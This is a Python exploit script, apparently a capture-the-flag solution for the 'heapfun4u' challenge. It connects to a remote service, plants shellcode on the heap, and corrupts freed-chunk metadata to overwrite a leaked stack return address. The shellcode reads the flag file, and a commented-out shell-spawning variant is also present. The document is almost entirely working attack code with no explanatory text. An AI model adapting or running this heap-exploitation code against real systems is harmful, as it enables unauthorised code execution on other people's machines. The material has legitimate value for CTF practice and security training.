#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'heapfun4u_873c6d81dd688c9057d5b229cf80579e.quals.shallweplayaga.me','port':3957}
#target     = {'host':'192.168.75.128','port':8080}

addr_bss    = 0x00602080

#==========
def attack(cmn):
    sc = ShellCode('amd64')
    
    shellcode  = '\xeb\x06'
    shellcode += '\x00'*(8-len(shellcode))
    #shellcode += sc.sh()
    shellcode += sc.read_file('flag', addr_bss)
    
    alloc(cmn,40)
    alloc(cmn,24)
    alloc(cmn,len(shellcode))

    addr_heap_shellcode = write(cmn, 3, shellcode)
    addr_stack_ret      = nice(cmn)+0x13c
    
    info("addr_heap_shellcode   = 0x%08x"%addr_heap_shellcode)
    info("addr_stack_ret        = 0x%08x"%addr_stack_ret)

    free(cmn,1)
    free(cmn,2)

    exploit  = pack_64(0)
    exploit += pack_64(addr_stack_ret-addr_heap_shellcode+0x48)
    exploit += pack_64(0)
    exploit += pack_64(addr_heap_shellcode-0x48)
    exploit += pack_64(addr_heap_shellcode)
    write(cmn, 1, exploit)

    alloc(cmn,40)

    cmn.read_until('| ')
    cmn.sendln('E')

    print cmn.read_all()

def alloc(cmn, size):
    cmn.read_until('| ')
    cmn.sendln('A')
    cmn.read_until('Size: ')
    cmn.sendln(str(size))

def free(cmn, index):
    cmn.read_until('| ')
    cmn.sendln('F')
    cmn.read_until('Index: ')
    cmn.sendln(str(index))

def write(cmn, index, data):
    cmn.read_until('| ')
    cmn.sendln('W')
    
    addr_heap = cmn.read_until('Write where: ').split('\n')[:-1]
    addr_heap = int(addr_heap[index-1].split(' ')[1],16)
    
    cmn.sendln(str(index))
    cmn.read_until('Write what: ')
    cmn.send(data)
    return addr_heap

def nice(cmn):
    cmn.read_until('| ')
    cmn.sendln('N')
    return int(cmn.read_until('\n').split(' ')[-1],16)

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)
    """
    sh = Shell(cmn)
    sh.select()
    del(sh)
    """
    
    del(cmn)
    
#==========
